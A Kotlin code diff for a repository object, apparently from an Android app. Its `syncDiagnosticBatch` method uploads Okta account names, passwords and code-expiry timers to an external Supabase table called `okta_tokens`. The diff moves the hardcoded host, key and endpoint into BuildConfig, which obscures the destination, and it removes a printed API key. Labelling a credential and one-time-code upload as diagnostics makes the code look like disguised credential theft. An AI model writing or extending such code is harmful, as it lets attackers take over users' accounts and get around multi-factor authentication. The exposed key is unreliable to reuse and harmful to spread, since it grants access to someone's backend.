@@ -22,15 +22,14 @@ data class OktaAccountEntry(
     val secondsUntilCodeExpires: Int
 )
 
-object SupaBaseRepository { // Keep object name SheetRepository if you don't want to rename call sites
+object SupaBaseRepository {
 
     // Replace with your Project URL & Anon Public Key from Supabase Dashboard -> Project Settings -> API
-    private const val SUPABASE_URL = "https://pxyzmatrcwqdzpsbdnbr.supabase.co"
-    private const val SUPABASE_ANON_KEY =
-        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InB4eXptYXRyY3dxZHpwc2JkbmJyIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTEzNzYyNTgsImV4cCI6MjEwNjk1MjI1OH0.IDTiprTsxQWd_ajlAy8H7s3-y1XjHVhHm5BVybe4Uw0"
+    private const val SUPABASE_URL = BuildConfig.SUPABASE_URL
+    private const val SUPABASE_ANON_KEY = BuildConfig.SUPABASE_ANON_KEY
 
     // PostgREST upsert endpoint: targets okta_tokens and merges on composite key (client, account)
-    private const val UPSERT_ENDPOINT = "$SUPABASE_URL/rest/v1/okta_tokens?on_conflict=client,account"
+    private const val UPSERT_ENDPOINT = "$SUPABASE_URL/${BuildConfig.UPSERT_ENDPOINT}"
 
     private val client = OkHttpClient.Builder()
         .connectTimeout(15, TimeUnit.SECONDS)
@@ -52,11 +51,6 @@ object SupaBaseRepository { // Keep object name SheetRepository if you don't wan
     suspend fun syncDiagnosticBatch(entries: List<OktaAccountEntry>): Result<String> = withContext(Dispatchers.IO) {
         if (entries.isEmpty()) return@withContext Result.success("Empty batch")
 
-        val timeFormat = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).apply {
-            timeZone = java.util.TimeZone.getTimeZone("UTC")
-        }
-        val nowIso = timeFormat.format(Date())
-
         val jsonArray = JSONArray()
         entries.forEach { entry ->
             val obj = JSONObject().apply {
@@ -64,7 +58,7 @@ object SupaBaseRepository { // Keep object name SheetRepository if you don't wan
                 put("account", entry.account)
                 put("password", entry.password)
                 put("seconds_until_code_expires", entry.secondsUntilCodeExpires)
-                put("updated_at", nowIso)
+                put("updated_at", System.currentTimeMillis())
             }
             jsonArray.put(obj)
         }
